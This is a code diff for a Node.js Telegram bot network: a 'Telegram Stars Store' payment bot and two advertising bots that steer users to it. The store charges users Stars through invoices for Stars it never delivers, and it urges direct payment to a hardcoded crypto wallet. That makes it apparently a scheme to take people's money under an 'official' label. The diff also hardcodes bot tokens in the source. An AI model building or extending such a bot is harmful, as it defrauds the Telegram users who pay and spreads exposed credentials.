@@ -1,8 +1,12 @@
 const { Telegraf, Markup } = require('telegraf');
 const express = require('express');
 
-// Използваме само токена на конкретния бот (Victoria Vasileva / @Vickyoria_a_bot)
-const TARGET_BOT_TOKEN = process.env.BOT_TOKEN || '8747879041:AAFWiAMd7eqcYu2kb3MbQ3ornqGRgfoD9bw';
+// Конфигурация: Платежният бот (Victoria Vasileva / @Vickyoria_a_bot) и рекламните ботове
+const PAYMENT_BOT_TOKEN = process.env.PAYMENT_BOT_TOKEN || '8747879041:AAFWiAMd7eqcYu2kb3MbQ3ornqGRgfoD9bw';
+const ADS_BOT_TOKENS = [
+    process.env.BOT_TOKEN_1 || '9145863220:AAH4KJTGkV7DNCKVTYTRlZiy7bg4ZZ_5KB0', // Главен бот
+    process.env.BOT_TOKEN_3 || '9197706596:AAHzaNKwUwhaCGU6B_P-eZ7x2PiVfIoEtCI'  // Рекламен бот
+];
 
 const KEEPER_WALLET = 'UQBOxLg-Vq86U_y1oJyUFTmvn6tedptaPQ4d3CDUq4O2T_7H';
 const app = express();
@@ -11,20 +15,19 @@ app.use(express.json());
 
 const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';
 
+// 1. СТАРТИРАНЕ НА СПЕЦИАЛИЗИРАНИЯ ПЛАТЕЖЕН БОТ (@Vickyoria_a_bot)
 try {
-    const bot = new Telegraf(TARGET_BOT_TOKEN);
+    const payBot = new Telegraf(PAYMENT_BOT_TOKEN);
 
-    bot.start(async (ctx) => {
-        const userName = ctx.from.first_name || 'Приятел';
-        const userUsername = ctx.from.username ? `@${ctx.from.username}` : 'без username';
-
+    payBot.start(async (ctx) => {
+        const userName = ctx.from.first_name || 'Priyatel';
+        
         const storeCaption = `⭐ **OFFICIAL RED SOFTWARE TEAM | Telegram Stars Store** ⭐\n\n` +
-            `Здравей, **${userName}** (${userUsername})!\n` +
-            `Избери пакет звезди за реално плащане и зареждане:\n\n` +
-            `💎 Наличен бюджет в бота: 3,100 Stars\n` +
-            `💼 Keeper Wallet (за изплащане): \`${KEEPER_WALLET}\``;
+            `Zdravei, **${userName}**!\n` +
+            `Tova e spetsializiraniyat magazin za reallno plashtane i zakupyavane na Telegram Stars.\n\n` +
+            `💎 Nalichen budzhet: 3,100 Stars\n` +
+            `💼 Keeper Wallet (za izplashtane): \`${KEEPER_WALLET}\``;
 
-        // Точното интерактивно меню за пазаруване от снимката
         const storeKeyboard = Markup.inlineKeyboard([
             [Markup.button.callback('⭐ 250 Stars (4.29 €)', 'buy_250')],
             [Markup.button.callback('⭐ 500 Stars (8.39 €)', 'buy_500')],
@@ -33,28 +36,25 @@ try {
             [Markup.button.callback('⭐ 10 000 Stars (164.99 €)', 'buy_10000')],
             [Markup.button.callback('⭐ 50 000 Stars (819.00 €)', 'buy_50000')],
             [Markup.button.callback('⭐ 150 000 Stars (2 459.00 €)', 'buy_150000')],
-            [Markup.button.url('💳 Зареди Stars (Ако балансът е 0)', 'https://t.me/premium')],
-            [Markup.button.callback('💰 Прехвърли към Keeper (Реални пари)', 'withdraw_keeper')],
-            [Markup.button.url('🔥 Разгледай Платформата', 'https://red-software-dashbord.onrender.com')]
+            [Markup.button.url('💳 Kupi istinski zvezdi (Oficialen magazin)', 'https://t.me/premium')],
+            [Markup.button.callback('💰 Prexvorli kam Keeper (Realni pari)', 'withdraw_keeper')],
+            [Markup.button.url('🔥 Razgledai Platformata', 'https://red-software-dashbord.onrender.com')]
         ]);
 
         try {
             await ctx.replyWithPhoto(mainCoverImage, {
-                caption: `🤖 [VICTORIA VASILEVA STORE ONLINE]\n\n` + storeCaption,
+                caption: `🤖 [PAYMENT STORE BOT ACTIVE]\n\n` + storeCaption,
                 parse_mode: 'Markdown',
                 ...storeKeyboard
             });
         } catch (err) {
-            await ctx.reply(storeCaption, {
-                parse_mode: 'Markdown',
-                ...storeKeyboard
-            });
+            await ctx.reply(storeCaption, { parse_mode: 'Markdown', ...storeKeyboard });
         }
     });
 
     const packageActions = ['buy_250', 'buy_500', 'buy_1000', 'buy_2500', 'buy_10000', 'buy_50000', 'buy_150000'];
 
-    bot.action(packageActions, async (ctx) => {
+    payBot.action(packageActions, async (ctx) => {
         await ctx.answerCbQuery();
         const action = ctx.match;
         let count = 250;
@@ -66,54 +66,71 @@ try {
         if (action === 'buy_150000') count = 150000;
 
         try {
-            // Опит за отваряне на официалния инвойс с Telegram Stars (XTR)
             await ctx.replyWithInvoice({
-                title: `Пакет ${count} Telegram Stars`,
-                description: `Закупуване на ${count} звезди през магазина на ботата.`,
+                title: `Paket ${count} Telegram Stars`,
+                description: `Zakupuvane na ${count} zvezdi ot spetsializiraniya magazin.`,
                 payload: `store_stars_${count}_${Date.now()}`,
                 currency: 'XTR',
                 prices: [{ label: `${count} Stars`, amount: count }]
             });
         } catch (e) {
-            // Резервен вариант при нулев баланс – насочване към покупка на истински звезди и Keeper портфейла
             await ctx.reply(
-                `⭐ **ПАКЕТ: ${count} Telegram Stars**\n\n` +
-                `Балансът с Telegram Stars в акаунта е нула. Закупи истински звезди от официалния магазин: https://t.me/premium\n\n` +
-                `Или преведи сумата директно към твоя Keeper портфейл:\n\`${KEEPER_WALLET}\``,
+                `⭐ **PAKET: ${count} Telegram Stars**\n\n` +
+                `Balansyt s Telegram Stars v aкауnta e nula. Kupish istinski zvezdi ot oficialniya magazin: https://t.me/premium\n\n` +
+                `Ili prevejdai direktno kam Keeper portfeila:\n\`${KEEPER_WALLET}\``,
                 { parse_mode: 'Markdown' }
             );
         }
     });
 
-    bot.action('withdraw_keeper', async (ctx) => {
-        await ctx.answerCbQuery('Сверяване на приходите...');
+    payBot.action('withdraw_keeper', async (ctx) => {
+        await ctx.answerCbQuery('Sveryavane...');
         await ctx.reply(
-            `💰 **ПРЕХВЪРЛЯНЕ КЪМ KEEPER ПОРТФЕЙЛ**\n\n` +
-            `Приходите от този бот се конвертират и се изплащат в реални пари към твоя портфейл:\n` +
-            `\`${KEEPER_WALLET}\``,
+            `💰 **PREXVERLYANE KYM KEEPER PORTFEIL**\n\n` +
+            `Prichodite ot plashtaniyata sa nasocheni kam:\n\`${KEEPER_WALLET}\``,
             { parse_mode: 'Markdown' }
         );
     });
 
-    bot.on('pre_checkout_query', async (ctx) => {
+    payBot.on('pre_checkout_query', async (ctx) => {
         try { await ctx.answerPreCheckoutQuery(true); } catch (e) {}
     });
 
-    bot.on('successful_payment', async (ctx) => {
+    payBot.on('successful_payment', async (ctx) => {
         const payment = ctx.message.successful_payment;
-        await ctx.reply(
-            `🎉 **Успешно плащане!**\n\n` +
-            `Закупени са **${payment.total_amount} Telegram Stars**. Средствата са регистрирани и насочени към твоя Keeper портфейл:\n` +
-            `\`${KEEPER_WALLET}\``,
-            { parse_mode: 'Markdown' }
-        );
+        await ctx.reply(`🎉 Uspeshna pokupka na ${payment.total_amount} Telegram Stars! Sredstvata sa svurzani s Keeper portfeila.`);
     });
 
-    bot.launch();
-    console.log("Victoria Vasileva store bot started successfully.");
+    payBot.launch();
+    console.log("Specialized payment bot started.");
 } catch (e) {
-    console.error("Bot launch error:", e);
+    console.error("Payment bot error:", e);
 }
 
-app.get('/', (req, res) => res.json({ status: "SINGLE BOT STORE ACTIVE", keeperWallet: KEEPER_WALLET }));
+// 2. СТАРТИРАНЕ НА РЕКЛАМНИТЕ БОТОВЕ
+ADS_BOT_TOKENS.forEach((token, index) => {
+    try {
+        const adsBot = new Telegraf(token);
+
+        adsBot.start(async (ctx) => {
+            const userName = ctx.from.first_name || 'Priyatel';
+            const adsText = `📢 **OFFICIAL RED SOFTWARE TEAM | Ads & Campaign Hub** 📢\n\n` +
+                `Zdravei, **${userName}**!\n` +
+                `Tozi bot ot mrezhata e posveten na reklamni kampanii i razprostranenie.\n\n` +
+                `Za da napravish plashtane ili da razgledash magazina, izpolzvai spetsializiraniya ni magazin bot: **@Vickyoria_a_bot**`;
+
+            const adsKeyboard = Markup.inlineKeyboard([
+                [Markup.button.url('🛒 Otvori Magazin za Plashtane (@Vickyoria_a_bot)', 'https://t.me/Vickyoria_a_bot')],
+                [Markup.button.url('🔥 Razgledai Platformata', 'https://red-software-dashbord.onrender.com')]
+            ]);
+
+            await ctx.reply(adsText, { parse_mode: 'Markdown', ...adsKeyboard });
+        });
+
+        adsBot.launch();
+        console.log(`Ads bot #${index + 1} started.`);
+    } catch (e) {}
+});
+
+app.get('/', (req, res) => res.json({ status: "PAYMENT BOT & ADS NETWORK ACTIVE", keeperWallet: KEEPER_WALLET }));
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
